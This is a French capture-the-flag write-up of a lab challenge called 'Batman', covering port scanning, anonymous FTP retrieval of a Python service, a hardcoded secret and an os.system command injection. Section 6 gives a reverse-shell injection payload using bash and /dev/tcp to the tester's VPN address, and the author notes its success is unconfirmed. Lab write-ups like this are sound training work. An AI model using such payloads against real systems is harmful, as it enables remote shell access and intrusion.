# Batman

## Contexte

- **Nom du challenge** : Batman
- **Catégorie** : Réseau / Injection de commandes
- **Difficulté** : non précisée
- **Objectif** : exploiter le service Gotham Hotline pour obtenir un reverse shell.
- **Cible** : `10.10.0.8`

Je documente les étapes vérifiées, puis l'exploitation prévue : je n'ai pas confirmé
la réception du reverse shell ni récupéré de flag.

---

## 1. Reconnaissance

Depuis Exegol, je lance un scan de tous les ports TCP :

```bash
nmap -Pn -p- -sC -sV 10.10.0.8
```

`-Pn` ignore la découverte d'hôte, `-p-` couvre tous les ports TCP, `-sC` lance
les scripts par défaut et `-sV` identifie les services et leurs versions.

Résultats importants :

```text
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH
3000/tcp  open  unknown
```

Nmap signale un **accès FTP anonyme**, le fichier `alert.py` et un répertoire
`logs/` annoncé comme accessible en écriture. Le port **3000** répond avec un
message du service **Gotham Hotline**.

---

## 2. Récupération du code par FTP anonyme

Je me place dans `/tmp` sur ma machine avant de me connecter :

```bash
cd /tmp
ftp 10.10.0.8
```

Je saisis `anonymous` comme nom d'utilisateur, puis les commandes FTP :

```text
ls
get alert.py
bye
```

Le téléchargement réussit. Je lis ensuite le fichier local :

```bash
cat /tmp/alert.py
```

**À retenir** : mon répertoire local `/workspace` n'était pas accessible en écriture.
Le `Permission denied` concernait l'enregistrement local, pas les droits de lecture
sur le serveur FTP. Utiliser `/tmp` résout ce problème local.

---

## 3. Analyse / Identification de la vulnérabilité

Dans `alert.py`, je relève l'écoute sur `0.0.0.0:3000` et le secret attendu pour
l'authentification : `G0th4mN33dsTh3B4t!`.

Après authentification, le programme reçoit le message d'urgence dans `alert_text`.
La logique vulnérable est la suivante :

```python
alert_text = conn.recv(1024).strip().decode()
os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
```

**Vulnérabilité** : `os.system()` exécute une commande via un shell. La saisie
utilisateur est insérée sans neutralisation dans la commande passée à `bash -c`.
Des métacaractères comme `;` peuvent donc introduire une autre commande : c'est une
**injection de commandes**.

---

## 4. Connexion au service Gotham Hotline

Je me connecte au service TCP avec Netcat :

```bash
nc -nv 10.10.0.8 3000
```

`-n` désactive la résolution DNS et `-v` affiche les détails de connexion.
L'échange est le suivant :

```text
Gotham Hotline: Identify yourself.
G0th4mN33dsTh3B4t!
Authorized signal. What is the emergency?
```

L'authentification est acceptée. Le **second champ**, celui du message d'urgence,
est le point d'injection identifié dans le code.

---

## 5. Préparation du reverse shell

Je vérifie les adresses de mes interfaces Exegol :

```bash
ip addr
```

- `eth0` : `172.17.0.2`
- `tun0` : `10.8.0.244`

Je retiens **`10.8.0.244`**, l'adresse du VPN sur `tun0`, pour le retour de connexion.
Dans un autre terminal, je lance l'écoute :

```bash
nc -lvnp 4444
```

`-l` active l'écoute, `-v` les détails, `-n` désactive la résolution DNS et
`-p 4444` fixe le port local.

---

## 6. Exploitation prévue

Avec le port **4444** en écoute, je prévois d'injecter la commande suivante dans le
champ d'urgence. Cette charge est déduite du code ; son succès n'est pas confirmé :

```text
; bash -i >& /dev/tcp/10.8.0.244/4444 0>&1 #
```

Dans la commande interprétée par `bash -c`, `;` termine le `echo` et lance le shell.
Le `#` commente la redirection finale vers `report.txt`.
`bash -i` ouvre un shell interactif ; `/dev/tcp/10.8.0.244/4444` et les redirections
`>&` et `0>&1` relient sa sortie, ses erreurs et son entrée à ma connexion Netcat.

**Résultat attendu** : une injection de commandes menant à un reverse shell.
**État vérifié** : aucune réception de shell confirmée et aucun flag récupéré.

---

## Outils utilisés

- `nmap` — scan de tous les ports TCP
- `ftp` — accès anonyme et téléchargement du code source
- `cat` — lecture du code Python
- `ip` — identification de l'adresse VPN
- `nc` (Netcat) — dialogue TCP et écoute du reverse shell

## Techniques utilisées

- **FTP anonyme** : récupération d'un code source exposé
- **Analyse du code source** : secret en clair et appel à `os.system()`
- **Injection de commandes** : saisie non neutralisée interprétée par le shell
- **Reverse shell prévu** : connexion initiée par la cible vers mon adresse VPN
- **Diagnostic des permissions** : distinguer l'écriture locale des droits FTP distants